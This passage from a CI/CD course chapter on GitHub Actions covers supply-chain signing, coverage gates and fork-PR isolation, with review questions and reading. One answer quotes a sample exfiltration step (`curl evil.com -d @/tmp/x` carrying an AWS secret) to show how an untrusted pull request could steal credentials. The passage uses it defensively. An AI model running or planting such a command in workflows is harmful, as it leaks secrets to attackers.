- [ ] cosign keyless sign + cosign attest SBOM bound to the **digest**
      (not a tag); per-leg digest artifact for the fan-in into the
      GitOps PR job
- [ ] Branch protection on the GitOps repo: dev auto-merges; staging
      and prod overlay PRs require human review
- [ ] Coverage gates calibrated to risk (read-only services: none;
      write-path: 70%; money: 80%)
- [ ] Workflow file changes require platform CODEOWNERS review;
      actions ideally pinned to commit SHAs (teaching here uses major
      tags)

## Test your understanding

> Try each before opening the answer drawer. The act of trying is the exercise; the answer is the check.

1. **What is the "CI ate my repo" footgun, and what are the three structural defences the chapter's workflows use against it?**
   <details><summary>Show answer</summary>

   An untrusted PR (from a fork or external contributor) runs a workflow that has access to secrets — a single `echo $AWS_SECRET > /tmp/x; curl evil.com -d @/tmp/x` step exfiltrates everything the workflow can see. Three defences: (1) `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` guard on the privileged jobs (sign, push, GitOps PR) — fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal (`id-token: write` only when needed, default `contents: read`); (3) **don't** use `pull_request_target` against fork code unless the workflow is hardened — that trigger runs in the base repo's context with secrets, which is the exact attack surface. The combination of these three is what makes the workflow safe to expose to public-fork PRs.

   </details>

2. **Why does the chapter argue coverage gates should be *asymmetric* across services rather than one cluster-wide threshold?**
   <details><summary>Show answer</summary>

   Risk is asymmetric. payments-worker handles money — a bug is unrecoverable, so 80% coverage on every PR including informational ones is right. orders writes data — 70% on `main` only is right; PRs are advisory. catalog is read-only — no coverage gate, just the race detector. Cargo-culting one threshold (say "80% across the board") trains developers to ignore it: the catalog team adds noise tests to hit the number, the payments team feels the bar is too low, nobody trusts the metric. The chapter's discipline: coverage gates encode a real product decision, calibrated per-service.

   </details>

3. **A CI run signs a multi-arch image with `cosign sign <image>` (no `--recursive`), and the GitOps PR opens with the new digest. Three hours later, arm64 nodes report admission failures. Walk through what happened.**
   <details><summary>Show answer</summary>

   `cosign sign` without `--recursive` signs only the top-level manifest list, not the per-architecture entries. Kyverno's `verifyImages` at admission walks to the platform-specific image being pulled (linux/arm64 on the Graviton nodes) and looks for a signature on *that*; finding none, admission rejects. The fix: `cosign sign --recursive <image>` signs every per-arch entry. The chapter's signing job uses `--recursive` precisely because Phase 14-R Graviton nodes are in play; dropping the flag silently breaks arm64 admission while x86 keeps working. Lesson: multi-arch + cosign + admission verify requires `--recursive` end-to-end.

   </details>

4. **Hands-on extension — open a fork PR against the bookstore-platform CI workflow. What runs, what doesn't, and what does the run log show?**
   <details><summary>What you should see</summary>

   The lint, test, integration-test, and scan jobs run — they don't need secrets, they need only the public source code. The build-sign-push and update-gitops-pr jobs **skip** because of the `if: github.event_name == 'push' && github.ref == 'refs/heads/main'` guard; the run log shows them with a "skipped" status and a condition that didn't match. Critically, ECR push permissions and the GitOps repo PAT are never used in the fork's run because the jobs that would use them never executed. This is the chapter's structural defence in action — fork contributors can pass tests and submit PRs without holding any credential the workflow has.

   </details>

## Further reading

- **Rosso et al., _Production Kubernetes_, ch.11 — Building Platform
  Services** (CI/CD as the delivery interface of an internal developer
  platform; the framing this chapter operationalises in GitHub Actions).
- **Humble & Farley, _Continuous Delivery_, ch.5–6** (the deployment-
  pipeline-as-code discipline this chapter implements; the gate-DAG
  here is a 2026 specialisation of Humble & Farley's 2010 architecture).
- **GitHub Actions docs — Security hardening for GitHub Actions**:
  <https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions>
  (the authoritative reference for `pull_request_target`, OIDC, and
  fork-PR isolation).
- Official / project docs: GitHub Actions —
  <https://docs.github.com/en/actions>; AWS OIDC for GitHub Actions —
  <https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html>;
  cosign keyless — <https://docs.sigstore.dev/cosign/openid_connect/>;
  Trivy — <https://aquasecurity.github.io/trivy/>; syft —
  <https://github.com/anchore/syft>.
